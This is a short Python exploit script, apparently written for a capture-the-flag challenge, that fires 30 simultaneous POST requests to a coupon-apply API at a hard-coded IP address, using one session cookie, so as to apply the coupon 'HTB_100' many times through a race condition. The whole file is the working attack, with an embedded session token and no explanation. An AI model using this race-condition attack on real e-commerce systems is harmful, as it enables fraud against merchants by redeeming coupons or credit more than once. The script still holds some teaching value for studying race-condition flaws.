import requests
import multiprocessing as m

def race(cookie):
    req = requests.post("http://157.245.33.77:32484/api/coupons/apply", cookies = cookie, json = {"coupon_code":"HTB_100"})
    print(req.text)

if __name__ == "__main__":

    cock = {"session" : "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InR5bGVyXzRjNDg4YWQ0MTIiLCJpYXQiOjE2NTU4NDY5OTF9.MiNeFwt8Qzm0a5EkMIe02YJszUzrFIvdIbgvdm6MPMQ"}
    hui = []
    for i in range(30):
        hui.append(m.Process(target = race, args = (cock,)))

    for i in hui:
        i.start()

    for i in hui:
        i.join()

